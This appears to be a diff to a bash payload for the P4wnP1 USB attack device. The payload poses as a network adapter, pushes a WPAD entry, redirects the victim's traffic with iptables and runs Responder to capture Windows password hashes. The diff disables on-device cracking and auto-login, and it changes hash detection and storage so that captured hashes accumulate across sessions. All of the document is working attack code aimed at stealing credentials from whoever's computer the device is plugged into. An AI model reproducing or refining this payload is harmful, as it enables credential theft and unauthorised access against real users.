@@ -83,10 +83,10 @@ USB_PID=$(printf "0x%04X" $RANDOM)        # Random PID to raise chance of driver
 
 USE_ECM=false            # we need no Linux/Mac networking
 USE_RNDIS=true          # RNDIS network device to enable hash stealing
-USE_HID=true            # HID keyboard to allow entering cracked password
+USE_HID=false           # HID keyboard to allow entering cracked password
 USE_UMS=false           # no mass storage
 
-lang="us" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
+lang="gb" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
 
 # ==========================
 # Network and DHCP options
@@ -101,8 +101,8 @@ WPAD_ENTRY=true # provide a WPAD entry via DHCP pointing to responder
 
 
 # define some helper functions and custom vars
-CRACK=true # enable cracking of dumped hashes on P4wnP1
-LOGIN=true # enable Login attempt if hash is cracked
+CRACK=false # enable cracking of dumped hashes on P4wnP1
+LOGIN=false # enable Login attempt if hash is cracked
 
 function responder_db_contains_data()
 {
@@ -121,11 +121,15 @@ function responder_db_contains_data()
 
 function check_for_hash()
 {
+	foundhash="false"
 	# exclude hashes for "SMB\"
+
 	if [[ $(sqlite3 $wdir/Responder/Responder.db "select fullhash from responder where not user='SMB\'") ]]; then
-		return 0
-	else
-		return 1
+		get_hash | cut -d':' -f1 | grep -v -e '^[[:space:]]*$' | while read -r username; do
+			if [[ ! $(echo $username | grep -o '.$') == "$" ]]; then
+				echo $username
+			fi
+		done
 	fi
 }
 
@@ -155,16 +159,19 @@ function onNetworkUp()
 	
 	# redirect unicast traffic for every destination to responder (cacth packets sent to our huge subnet ;-) )
 
-    iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
-    iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+	iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+	iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
 
 	echo "Starting responder..."
 
 	# delete Responder.db
-	rm $wdir/Responder/Responder.db
+        rnamez="Responder"
+	rcount=$(ls -la $wdir/Responder/ | grep "$rnamez" | grep ".db" | wc -l)
+        rname="$rnamez""_""$rcount"".db"
+	mv $wdir/Responder/Responder.db $wdir/Responder/$rname
 
 	# start responder in screen session
-    screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -d -r -w -P"
+	screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -d -r -w -P"
 
 	touch /tmp/responder_started
 
@@ -182,11 +189,13 @@ function onTargetGotIP()
 	echo "Waiting for hashes to arrive "
 
 	# wait till hashes have been grabbed (exluding hashes for host\user "SMB\"
-	until responder_db_contains_data && check_for_hash; do
-		sleep 0.5 # 500 ms delay before recheck
+
+	while true; do
+		sleep 0.5
+		if [[ $(check_for_hash | wc -l) -gt 0 ]]; then
+			break
+		fi
 	done
-	
-	echo
 
 	# at this point we should have one or more hashes, so we save them and kill responder
 	
@@ -198,8 +207,8 @@ function onTargetGotIP()
 
 	hashfile=$wdir/collected/$fname
 	
-	get_hash > $hashfile
-	chown -R pi:pi $wdir/collected
+	get_hash >> $hashfile
+	chown -R lava:lava $wdir/collected
 	sync
 	echo "Captured the following hashes:"
 	cat $hashfile
